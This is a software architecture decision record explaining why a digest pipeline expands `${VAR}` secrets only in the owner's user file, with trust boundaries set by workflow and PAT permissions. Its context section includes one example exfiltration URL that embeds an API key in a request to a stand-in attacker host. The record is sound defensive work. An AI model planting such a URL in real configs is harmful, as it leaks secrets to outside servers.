# 0002. Expand `${VAR}` only in the owner's user file

- Status: accepted, owner ID source amended by 0003
- Date: 2026-11-08

## Context
User files `data/users/<id>.json` were passed through `_expand_env_vars`, which expands any environment variable. The `digest` job of `users-digest.yml` holds every secret (`GROQ_API_KEY*`, `HORIZON_WEBHOOK_URL` with the bot token, `LWN_KEY`), so a source URL like `https://evil.example/feed?k=${GROQ_API_KEY}` would send a key to a foreign server (#14). A Telegram bot running as a Cloudflare Worker will soon write user files with a fine-grained PAT that has `Contents: read & write` only. The owner's own file needs `${LWN_KEY}` and `${TELEGRAM_CHAT_ID}`.

## Options
- A: Per-user allowlist file in `data/users/` that the bot never writes. Plus: flexible. Minus: the PAT can write any file under `data/`, so the guarantee rests on Worker code, not on permissions.
- B: Repository variable `vars.HORIZON_OWNER_ID`. Plus: not in the tree. Minus: an extra manual setup step; the value is already public as a file name.
- C: Owner ID hard-coded as `HORIZON_OWNER_ID` in `users-digest.yml`, expansion only for the file whose name equals it, any `${NAME}` elsewhere is a `ConfigError`. Plus: the PAT cannot change `.github/workflows/` without the `Workflows` permission, so the bot cannot promote anyone to owner; no extra setup. Minus: only one user can use secrets; changing the owner needs a workflow edit.

## Decision
We will use option C. `load_user` expands `${VAR}` only when the file's id equals `HORIZON_OWNER_ID`; otherwise any `${NAME}` reference fails with a `ConfigError` that names the variable but never reads its value. Both the `plan` and `digest` jobs set `HORIZON_OWNER_ID`, otherwise `plan` would treat the owner's file as broken and drop `publish_site`.

## Consequences
- The trust boundary is the workflow file: moving the owner ID into `data/` or giving the bot's PAT the `Workflows` permission would reopen #14.
- Local runs of the owner's file need `HORIZON_OWNER_ID` in the environment.
- Fields that read secrets or files by name rather than via `${}` (for example `sources.twitter.apify_token_env`, `cookie_dir`) are not covered by this decision and must be restricted separately before users can write arbitrary source fields.

## Update (2026-11-11, ADR 0003)
The owner ID is no longer hard-coded in `users-digest.yml`: both jobs take `HORIZON_OWNER_ID` from the repository variable `vars.OWNER_ID` (option B), so a fork needs no workflow edit. The trust boundary still holds because the bot's PAT is granted only on the separate data repository (ADR 0003): it has no access to the code repository, its workflows or its variables, so the bot cannot promote anyone to owner. Granting that PAT access to the code repository, or the `Variables` or `Workflows` permission, would reopen #14.
